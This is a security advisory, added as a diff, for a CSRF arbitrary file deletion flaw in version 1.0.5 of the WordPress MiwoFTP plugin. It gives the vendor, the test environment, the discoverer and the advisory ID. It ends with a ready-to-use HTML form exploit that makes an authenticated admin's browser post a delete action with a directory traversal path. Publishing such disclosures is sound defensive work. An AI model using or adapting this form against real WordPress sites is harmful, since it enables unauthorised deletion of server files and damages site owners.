@@ -1,0 +1,45 @@
+WordPress MiwoFTP Plugin 1.0.5 CSRF Arbitrary File Deletion Exploit
+
+
+Vendor: Miwisoft LLC
+Product web page: http://www.miwisoft.com
+Affected version: 1.0.5
+
+Summary: MiwoFTP is a smart, fast and lightweight file manager
+plugin that operates from the back-end of WordPress.
+
+Desc: Input passed to the 'selitems[]' parameter is not properly
+sanitised before being used to delete files. This can be exploited
+to delete files with the permissions of the web server using directory
+traversal sequences passed within the affected POST parameter.
+
+Tested on: Apache 2.4.10 (Win32)
+           PHP 5.6.3
+           MySQL 5.6.21
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5240
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5240.php
+
+Vendor: http://miwisoft.com/wordpress-plugins/miwoftp-wordpress-file-manager#changelog
+
+
+24.03.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="http://localhost/wordpress/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=post" method="POST">
+      <input type="hidden" name="do_action" value="delete" />
+      <input type="hidden" name="first" value="y" />
+      <input type="hidden" name="selitems[]" value="../../../../../pls_mr_jailer_dont_deleteme.txt" />
+      <input type="submit" value="Gently" />
+    </form>
+  </body>
+</html>
